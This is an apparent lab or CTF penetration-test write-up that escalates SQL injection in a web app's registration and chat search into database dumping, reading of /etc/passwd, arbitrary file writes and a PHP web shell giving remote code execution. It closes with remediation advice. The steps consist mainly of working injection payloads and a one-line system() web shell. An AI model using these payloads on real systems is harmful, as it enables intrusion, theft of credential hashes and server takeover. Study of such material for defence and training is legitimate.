# SQL Injection From IP address to RCE

<br>

Objective is to conduct a Black Box penetration test on the web application owned by the client. The primary objective of this assessment is to identify, verify, and exploit potential SQL Injection vulnerabilities that could lead to unauthorized data disclosure or underlying server infrastructure compromise.

<br>

A single target IP address was provided with no prior information regarding the infrastructure, technology stack, or user credentials. We conducted a Black Box assessment.
<br>

## Vulnerability Detection & Information Gathering

<br>

Initial reconnaissance of the web application revealed a landing page hosting two primary authentication forms: `Login` and `Create Account`:

<br>

<img width="701" height="302" alt="image" src="https://github.com/user-attachments/assets/125a5ada-fdb0-4e4a-9215-62fab2150922" />

<br>

<br>

Further analysis of the registration interface indicated that account creation requires a mandatory `invitation code` adhering to the specific format: `letters-letters-numbers`:

<br>

<img width="700" height="298" alt="image" src="https://github.com/user-attachments/assets/96c890d3-2660-469c-a520-ba9dec3c7c12" />

<br>

<br>

Let's try to create a new account:

<br>

<img width="701" height="301" alt="image" src="https://github.com/user-attachments/assets/327ab1f2-1a46-4e91-8e0b-ec3b196d9f5a" />

<br>

<br>

An attempt to register an account without providing an invitation code, or by supplying an invalid placeholder, resulted in a validation error:

<br>

<img width="701" height="301" alt="image" src="https://github.com/user-attachments/assets/3241d5ed-8e01-4eae-bb97-9e27508931a6" />

<br>

<br>

To analyze the underlying authentication mechanics, the registration request was intercepted and inspected using `Burp Suite` proxy to see if we can bypass account creation logic:

<br>

<img width="805" height="401" alt="image" src="https://github.com/user-attachments/assets/b088407f-457c-42d1-aeed-dd62535e8b12" />

<br>

<br>

The application transmits data via an HTTP `POST` request with the following URL-encoded body:

<br>

```html
username=Bob&password=p%40ssw0rd&repeatPassword=p%40ssw0rd&invitationCode=abcd-efgh-1234
```

<br>


## Subverting account creation logic

<br>

We can try to bypass `invitation code` validation by injecting `' OR` payload to force the server to return `TRUE` and accept the wrong invitation code:

<br>

```html
username=Bob&password=p%40ssw0rd&repeatPassword=p%40ssw0rd&invitationCode=abcd-efgh-1234' OR '1'='1
```

<br>

<img width="803" height="396" alt="image" src="https://github.com/user-attachments/assets/87b4a2cd-3c54-40a4-bf15-a8907fddee9b" />

<br>

<br>

The server accepted the manipulated payload, confirming the presence of a SQL Injection vulnerability within the registration component. The application bypassed the validation check and successfully generated the new user profile.

<br>

Now we can login to see what we will find inside:

<br>

<img width="698" height="179" alt="image" src="https://github.com/user-attachments/assets/94abfed4-6978-43bd-93a2-9fa46a16bd0d" />


<br>

<br>

We indeed logged in as `Bob`

<br>


## Authenticated Exploitation & Database Enumeration

Once authenticated as `Bob`, we gained access to the main chat dashboard interface.

<br>

The dashboard features a message search form `search in conversation`, which sends `GET` requests containing a parameter `q` to search for messages directly within the database `/index.php?u=1&q=`.

<br>

### Determining Column Count via ORDER BY

<br>

To prepare for a `UNION`-based SQL injection, we need to determine the exact number of columns returned by the original query. We can achieve this by injecting an `ORDER BY` clause into the search field.

<br>

We systematically increment the column index until the database throws an error. Injecting `ORDER BY 4-- -` executes successfully without breaking the application logic, whereas `ORDER BY 5-- -` triggers an HTTP 500 error. This confirms that the vulnerable backend SQL query selects exactly 4 columns.

```html
GET /index.php?q=')%20ORDER%20BY%204%20--%20-&u=1
```

<br>

<img width="794" height="384" alt="image" src="https://github.com/user-attachments/assets/25d2b72f-3eec-4f84-9546-855d4b428183" />

<br>

<br>

<img width="800" height="383" alt="image" src="https://github.com/user-attachments/assets/6794f2aa-9174-4a50-8170-da917723fdab" />

<br>

<br>

### Database Schema & Data Enumeration

<br>

With the column count established, a `UNION SELECT` technique was leveraged to extract metadata and dump sensitive information from the database via the system's `information_schema`.

<br>

By injecting the following SQL query we see that web application renders only columns 3 and 4. We will use them for our payloads.

<br>

```sql
') UNION SELECT 1, 2, 3, 4 -- -
```

<br>


<img width="953" height="398" alt="image" src="https://github.com/user-attachments/assets/34448654-0c59-41e7-b8d3-0b99ca8eabbd" />

<br>

<br>


**Extracting Database Version & Current User:**

<br>

```sql
') UNION SELECT 1, 2, @@version, user() -- -
```

<br>

<img width="959" height="364" alt="image" src="https://github.com/user-attachments/assets/ad27f15f-0c71-4a3d-a83c-1683c66003be" />

<br>

<br>


**Extracting Database Name:**

<br>

```sql
') UNION SELECT 1, 2, 3, database() -- -
```

<br>



<img width="941" height="332" alt="image" src="https://github.com/user-attachments/assets/21497a3c-3f9e-418f-ad6a-49702f5a52e4" />

<br>

<br>


**Enumerating Table Names**:

<br>

```sql
UNION SELECT 1, 2, 3, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<database_name>' -- -
```

<br>

<img width="949" height="335" alt="image" src="https://github.com/user-attachments/assets/de5285b8-e9f2-4471-8f10-8fce08646813" />

<br>

<br>

There are 3 Tables in our `Database`. We will inspect `Users` because this table might contain sensitive information.

<br>

**Enumerating Columns**

<br>

```sql
 UNION SELECT 1, 2, 3, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users' -- -
```

<br>

<img width="764" height="323" alt="image" src="https://github.com/user-attachments/assets/39713cb6-5f91-483b-9efd-5db2db68160d" />

<br>

<br>

The Table `Users` contains 5 `Columns`. Now we have gathered enough information for the final injection:

<br>

```sql
 UNION SELECT 1, 2, U<snip...>, <snip...> FROM ch<snip...>.Users -- -
```

<br>

<img width="764" height="319" alt="image" src="https://github.com/user-attachments/assets/8faf6181-4316-4b6e-9047-af28eed1283b" />

<br>

<br>

We have dumped the sensitive information from the Database: `user's names` and `hashed passwords`.

<br>


## Escalation to File System Access

After extracting sensitive records from the database, the assessment focused on evaluating the database user's privileges to determine if the flaw could be escalated to interaction with the underlying host file system.

<br>

**Checking Database User Privileges**

<br>

To check if the database user possesses file system read/write capabilities, the `user_privileges` table was queried for the `FILE` privilege:

<br>

```sql
UNION SELECT 1, 2, grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'c<snip...>'@'localhost'"-- -
```

<br>

<img width="764" height="348" alt="image" src="https://github.com/user-attachments/assets/dda4975f-955b-402a-b71b-26ef5723b2dc" />


<br>

<br>

The query confirmed that the active database user holds the `FILE` privilege, granting permission to read and create files on the host system.

<br>

**Reading System Files**

<br>

To verify the ability to read arbitrary files from the server, the `LOAD_FILE()` function was executed targeting a standard system file `/etc/passwd`:

<br>

```sql
UNION SELECT 1, 2, 3, LOAD_FILE('/etc/passwd') -- -
```

<br>


<img width="770" height="320" alt="image" src="https://github.com/user-attachments/assets/669600e9-7efe-43ef-9d39-8971fae5225e" />

<br>

<br>

The server successfully rendered the contents of /etc/passwd, validating local file access capability.

<br>

## Enumerating secure_file_priv & Web Root Path 

<br>

Before attempting file writing operations, the global variable `secure_file_priv` was checked to identify path restrictions enforced by the DBMS. The `information_schema.global_variables` table contains these records:

<br>

```sql
UNION SELECT 1, 2, variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv' -- -
```

<br>

<img width="764" height="323" alt="image" src="https://github.com/user-attachments/assets/a6e7da44-a9bd-4970-be21-4dd35b0a6437" />

<br>

<br>

The result indicated that `secure_file_priv` was empty, confirming that the DBMS does not restrict file operations to a specific directory.

<br>

**Locating The Web Root Directory**

<br>

Because the target application uses `Nginx`, we can check its default directory:

<br>

```sql
UNION SELECT 1, 2, 3, LOAD_FILE('/etc/nginx/sites-enabled/default') -- -
```

<br>

<img width="761" height="325" alt="image" src="https://github.com/user-attachments/assets/ce013a49-869e-4523-932c-69215266def7" />

<br>

<br>

Inspection of the retrieved configuration confirmed the web application's root directory location `/var/<snip...>`

<br>


## Arbitrary File Write & Remote Code Execution

<br>

To verify write permissions within the web-accessible directory, a simple text file was written to the Web Root:

<br>

```sql
UNION SELECT 1, 2, 3, "File upload testing" into outfile '/var/<web_root_path...>/test.txt' -- -
```

<br>

<img width="767" height="303" alt="image" src="https://github.com/user-attachments/assets/45c7a27d-59e2-4087-b658-f6139b30f3e6" />


<br>

<br>

While executing `INTO OUTFILE` within a `UNION` query may trigger an `HTTP 500 Internal Server Error` due to data structure mismatch in the application interface

<br>


<img width="272" height="78" alt="image" src="https://github.com/user-attachments/assets/41ddeef6-5719-4eb2-af30-520e6a7b5c1d" />

<br>

<br>

Verification was confirmed by requesting the `test.txt` file directly via HTTP

<br>


**Deploying a PHP Web Shell**

<br>

Having confirmed write access, a simple PHP command execution payload was injected to establish a Web Shell:

<br>

```php
<?php system($_REQUEST[0]); ?>
```

<br>

We will use "" instead of digits to upload only Web Shell without chunk data:

<br>

```sql
UNION SELECT "", "", "", "<?php system($_REQUEST[0]); ?>" into outfile '/var/<snip...web_root_path>/shell.php' -- -
```

<br>

**Verifying Command Execution**

<br>

```http
https://IP/PORT/shell.php?0=id
```

<br>

Response confirmed execution under the `www-data` web server account context.

<br>

<img width="312" height="56" alt="image" src="https://github.com/user-attachments/assets/39435cc4-1649-44bc-94a9-d84903516dec" />

<br>

<br>

**Locating and Retrieving the Flag**

<br>

<img width="399" height="62" alt="image" src="https://github.com/user-attachments/assets/c31a75b1-6514-40cd-80d1-e2ed9fe410e3" />

<br>

<br>

```http
https://IP/PORT/shell.php?0=cat%20/flag<snip...>.txt
```

<br>

<img width="388" height="53" alt="image" src="https://github.com/user-attachments/assets/f97277c1-cb0c-4e09-9f56-d137ced57123" />

<br>

<br>

```plaintext
06<snip...>8d
```

<br>

The target information was successfully extracted, confirming full Remote Code Execution and complete system compromise via SQL Injection.

<br>


## Remediation Recommendations

<br>

To mitigate these vulnerabilities, the following security controls should be implemented:

<br>

**Parameterized Queries:** Refactor all SQL interactions within authentication and search components to use Prepared Statements to completely neutralize SQL Injection vectors.

<br>

**Restrict Database Privileges:** Revoke the `FILE` privilege from the database service user to prevent interaction with the underlying host file system.

<br>

**Enforce File Restrictions:** Configure `secure_file_priv` in the MySQL/MariaDB configuration to `secure_file_priv = NULL`.

<br>

**Least Privilege Principles:** Ensure the web application user operates with strict directory permissions, preventing write operations within the public Web Root. Revoke access to `information_schema` database and grant only `SELECT` privilege to the database user from the table it has to interact with (i.e. table `Messages`), without having access to users and hashed passwords.
